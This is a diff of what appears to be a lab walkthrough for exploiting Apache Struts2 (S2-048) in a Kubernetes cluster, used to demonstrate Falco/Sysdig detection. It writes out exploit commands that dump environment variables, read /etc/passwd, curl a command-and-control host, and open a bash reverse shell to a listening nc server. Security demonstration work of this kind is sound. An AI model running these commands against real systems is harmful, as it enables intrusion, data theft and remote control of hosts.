@@ -24,11 +24,15 @@ ubuntu@brett-jumpbox:myhomedir/apache-struts2-PoC
 kubectl get service -n struts  
 NAME     TYPE           CLUSTER-IP       EXTERNAL-IP                                                              PORT(S)          AGE  
 `struts   LoadBalancer   10.100.144.108   a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com   8080:30524/TCP   153m` 
-  
 
-~/apache-struts2-PoC python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'  
+First, on the cc server, start some simple web server such as: python3 webserver.py  
 
-...and we dump the environment, not good!    
+OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu box):  
+
+`cd ~/apache-struts2-PoC`    
+`python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'env'`  
+
+...and we dump the environment to the CC server, not good!  
 
 KUBERNETES_SERVICE_PORT_HTTPS=443  
 KUBERNETES_SERVICE_PORT=443  
@@ -39,19 +43,11 @@ JAVA_HOME=/usr/local/openjdk-8
 GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5  
 etc..  
   
-   
-~/apache-struts2-PoC$  
-curl 127.0.0.1:8080/showcase.action -v  
-#python3 -m venv .  
-python exploitS2-048-cmd.py 127.0.0.1:8080 'cat /etc/passwd'  
-  
-Now, on the cc server, start some simle web server such as: python3 webserver.py  
+OK that was fun, what else can we do? Curl?  
 
-And now, exploit!  
+`python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster`  
 
-`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster`  
-
-Now, I modified an existing Falco rule to warn on curl GET - that's right, we can get granular enough to tell the difference between a curl POST and a curl get!  
+I wondered if I could modify an existing Falco rule to warn on curl GET? Yes! We can get granular enough to tell the difference between a curl POST and a curl GET that is awesome!  
 So, this GET shows up on our little CC web server, and logs in Sysdig as a warning about curl, naughty, but I'll allow it, this time!  
 
 OK now with our confidence sky high, through the roof, let's post the whole dang passwd file to our CC server here we go:  
@@ -66,6 +62,8 @@ So now to put the cherry on top, let's do a reverse shell:
 On our CC server let's just listen like so: nc -l 4242  
 
 And then from our attack box let's `python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'`
+
+And let's watch the fun unfold:  
 
 ![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)
 
